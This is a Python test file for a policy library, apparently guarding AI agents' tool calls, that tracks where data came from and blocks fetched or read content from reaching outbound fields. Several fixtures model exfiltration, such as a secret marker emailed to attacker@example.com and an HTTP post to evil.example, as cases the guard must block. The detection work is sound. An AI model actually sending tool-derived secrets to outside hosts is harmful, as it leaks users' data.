"""Flow-typed policy: boundary provenance and the source→sink condition (R9)."""
from __future__ import annotations

import pytest

from interlock import flow
from interlock.enforce import Blocked, Verdict
from interlock.event import SensorEvent
from interlock.flow import (
    FlowTracker,
    normalise_origins,
    origin_for_principal,
    origin_for_tool,
)
from interlock.interceptors.mcp import enforce_tool_call, enforce_tool_result
from interlock.policy.declarative import load_policy
from interlock.policy.engine import PolicyEngine


@pytest.fixture(autouse=True)
def _fresh_tracker():
    previous = flow.set_tracker(FlowTracker())
    try:
        yield
    finally:
        flow.set_tracker(previous)


def _policy(rule):
    return load_policy({"version": 1, "rules": [rule]})


def _flow_rule(source="tool:fetch_url", sink="body", verdict="block"):
    return {
        "id": "no-fetched-egress",
        "verdict": verdict,
        "reason": "fetched data reached an outbound field",
        "when": {"flow": {"source": source, "sink": sink}},
    }


# --- the tracker ---------------------------------------------------------------


def test_a_value_keeps_its_origin_at_any_nested_path():
    tracker = FlowTracker()
    tracker.record(
        {"content": "the quarterly figures are SECRET-MARKER-abcdefghijklmnop"},
        ["tool:read_file"],
        span_id="run-1",
    )

    origins = tracker.origins_for(
        {"message": {"body": "prefix SECRET-MARKER-abcdefghijklmnop suffix"}},
        span_id="run-1",
    )

    assert origins == {"message.body": ("tool:read_file",)}


def test_origins_do_not_cross_spans():
    tracker = FlowTracker()
    tracker.record("SECRET-MARKER-abcdefghijklmnop", ["tool:read_file"], span_id="run-1")

    assert tracker.origins_for(
        {"body": "SECRET-MARKER-abcdefghijklmnop"}, span_id="run-2"
    ) == {}
    assert tracker.origins_for(
        {"body": "SECRET-MARKER-abcdefghijklmnop"}, span_id="run-1"
    ) == {"body": ("tool:read_file",)}


def test_short_and_repeated_values_are_not_remembered():
    tracker = FlowTracker()
    tracker.record("ok", ["tool:read_file"])
    tracker.record("x" * 100, ["tool:read_file"])
    tracker.record("x" * 100, ["tool:other"])

    assert tracker.origins_for({"body": "x" * 100}, span_id=None) == {
        "body": ("tool:read_file", "tool:other")
    }


def test_the_tracker_is_bounded_and_reports_no_origins_after_reset():
    tracker = FlowTracker(max_fragments=2)
    for index in range(4):
        tracker.record("UNIQUE-FRAGMENT-{:04d}-abcdefgh".format(index), ["tool:read_file"])
    assert tracker.origins_for(
        {"body": "UNIQUE-FRAGMENT-0000-abcdefgh"}, span_id=None
    ) == {}
    assert tracker.origins_for(
        {"body": "UNIQUE-FRAGMENT-0003-abcdefgh"}, span_id=None
    ) == {"body": ("tool:read_file",)}

    tracker.reset()
    assert tracker.origins_for(
        {"body": "UNIQUE-FRAGMENT-0003-abcdefgh"}, span_id=None
    ) == {}


def test_origin_labels_canonicalise_tool_actions():
    assert origin_for_tool("fetch.URL") == "tool:fetch_url"
    assert origin_for_tool(None) == "tool:"
    assert origin_for_principal("acme/agent42") == "principal:acme/agent42"
    assert origin_for_principal(" ") is None


def test_a_malformed_origin_map_is_dropped_not_raised():
    event = SensorEvent(action="x", origins={"body": object(), "to": "tool:fetch_url"})
    assert event.origins == {"to": ("tool:fetch_url",)}
    assert normalise_origins({"body": ["tool:a", "", 3]}) == {"body": ("tool:a",)}


# --- the declarative condition -------------------------------------------------


def test_a_flow_rule_blocks_the_named_sink_only():
    engine = _policy(_flow_rule())
    tainted = SensorEvent(
        action="send_email",
        args={"to": "ops@example.com", "body": "the report"},
        origins={"body": ("tool:fetch_url",)},
    )
    clean = SensorEvent(action="send_email", args={"to": "ops@example.com", "body": "hi"})

    blocked = engine.evaluate(tainted)

    assert blocked.verdict == Verdict.BLOCK
    assert blocked.attributed_to == "body"
    assert blocked.policy_id == "no-fetched-egress"
    assert engine.evaluate(clean).verdict == Verdict.ALLOW


def test_source_and_sink_selectors_are_globs():
    engine = _policy(_flow_rule(source="tool:*", sink="payload.*"))
    event = SensorEvent(
        action="http_post",
        args={"payload": {"body": "x"}},
        origins={"payload.body": ("tool:read_file",)},
    )

    assert engine.evaluate(event).verdict == Verdict.BLOCK


def test_a_principal_origin_is_a_source_too():
    engine = _policy(_flow_rule(source="principal:acme/*", sink="to"))
    event = SensorEvent(
        action="send_email",
        args={"to": "outside@example.com"},
        origins={"to": ("principal:acme/agent42",)},
    )

    assert engine.evaluate(event).verdict == Verdict.BLOCK


def test_a_malformed_flow_selector_is_quarantined_at_load():
    engine = _policy({"id": "bad", "verdict": "block",
                      "when": {"flow": {"source": "", "sink": "body"}}})

    assert engine.policy_ids == []
    assert engine.quarantined and "source" in engine.quarantined[0]


def test_a_flow_rule_is_equivalent_to_the_hand_written_source_sink_rule():
    """The general mechanism must reproduce the bespoke predicate exactly."""
    from interlock.policy.engine import deny_when

    def hand_written(event):
        return any(
            (path == "body" or path.endswith(".body"))
            and any(label.startswith("tool:fetch") for label in labels)
            for path, labels in getattr(event, "origins", {}).items()
        )

    general = _policy(_flow_rule(source="tool:fetch*", sink="body"))
    bespoke = deny_when(hand_written, "hand-written source-sink", "bespoke")
    cases = [
        SensorEvent(action="send_email", args={"body": "x"},
                    origins={"body": ("tool:fetch_url",)}),
        SensorEvent(action="send_email", args={"body": "x"},
                    origins={"body": ("tool:read_file",)}),
        SensorEvent(action="send_email", args={"body": "x"}),
        SensorEvent(action="send_email", args={"to": "a@b", "body": "x"},
                    origins={"to": ("tool:fetch_url",)}),
        SensorEvent(action="send_email", args={"payload": {"body": "x"}},
                    origins={"payload.body": ("tool:fetch_url",)}),
    ]

    for event in cases:
        left = general.evaluate(event)
        right = bespoke(event)
        right_blocked = right is not None and right.verdict == Verdict.BLOCK
        assert (left.verdict == Verdict.BLOCK) is right_blocked


# --- the boundary --------------------------------------------------------------


def test_a_tool_result_taints_a_later_call_end_to_end():
    engine = _policy(_flow_rule(sink="body"))

    result = enforce_tool_result(
        "fetch_url", "SECRET-MARKER-abcdefghijklmnop", engine=engine,
    )
    assert result == "SECRET-MARKER-abcdefghijklmnop"

    with pytest.raises(Blocked) as caught:
        enforce_tool_call(
            "send_email",
            {"to": "attacker@example.com", "body": "SECRET-MARKER-abcdefghijklmnop"},
            engine=engine,
        )

    assert caught.value.decision.attributed_to == "body"
    assert "no-fetched-egress" == caught.value.decision.policy_id


def test_a_result_that_does_not_reach_an_argument_is_allowed():
    engine = _policy(_flow_rule(sink="body"))
    enforce_tool_result("fetch_url", "SECRET-MARKER-abcdefghijklmnop", engine=engine)

    safe = enforce_tool_call(
        "send_email", {"to": "ops@example.com", "body": "unrelated"}, engine=engine,
    )

    assert safe["body"] == "unrelated"


def test_a_declared_origin_works_without_a_prior_result():
    engine = _policy(_flow_rule(sink="body"))

    with pytest.raises(Blocked):
        enforce_tool_call(
            "send_email", {"body": "anything"}, engine=engine,
            origins={"body": ["tool:fetch_url"]},
        )


def test_the_network_egress_guard_consumes_provenance():
    from interlock.detectors.data_egress import network_egress_guard

    rule = network_egress_guard(
        ["api.acme.com"], block_origins=["tool:fetch_url"],
    )
    engine = PolicyEngine(rules=[rule])
    tainted = SensorEvent(
        action="http_post",
        args={"url": "https://api.acme.com/collect", "body": "report"},
        origins={"body": ("tool:fetch_url",)},
    )
    clean = SensorEvent(
        action="http_post",
        args={"url": "https://api.acme.com/collect", "body": "report"},
    )

    blocked = engine.evaluate(tainted)
    assert blocked.verdict == Verdict.BLOCK
    assert blocked.attributed_to == "body"
    assert engine.evaluate(clean).verdict == Verdict.ALLOW


def test_the_detector_and_the_general_rule_agree_on_the_egress_case():
    """The hand-written egress case and its flow-rule statement decide alike."""
    from interlock.detectors.data_egress import network_egress_guard

    detector = PolicyEngine(rules=[network_egress_guard(
        ["api.acme.com"], block_origins=["tool:fetch_url"])])
    general = _policy({
        "id": "flow-egress", "verdict": "block", "reason": "flow",
        "when": {"all": [
            {"action": "http_post"},
            {"any": [
                {"flow": {"source": "tool:fetch_url", "sink": "*"}},
                {"not": {"arg": "url", "glob": "*://api.acme.com/*"}},
            ]},
        ]},
    })
    cases = [
        SensorEvent(action="http_post",
                    args={"url": "https://api.acme.com/c", "body": "x"},
                    origins={"body": ("tool:fetch_url",)}),
        SensorEvent(action="http_post",
                    args={"url": "https://api.acme.com/c", "body": "x"}),
        SensorEvent(action="http_post",
                    args={"url": "https://evil.example/c", "body": "x"}),
        SensorEvent(action="http_post",
                    args={"url": "https://evil.example/c", "body": "x"},
                    origins={"body": ("tool:fetch_url",)}),
    ]

    for event in cases:
        left = detector.evaluate(event).verdict == Verdict.BLOCK
        right = general.evaluate(event).verdict == Verdict.BLOCK
        assert left is right


def test_the_canary_case_is_a_flow_rule_too():
    """The canary guard is hand-written source→sink; the general rule states it."""
    engine = _policy(_flow_rule(source="tool:read_document", sink="body"))
    event = SensorEvent(
        action="http_post",
        args={"url": "https://api.acme.com", "body": "CANARY-planted-value"},
        origins={"body": ("tool:read_document",)},
    )

    assert engine.evaluate(event).verdict == Verdict.BLOCK
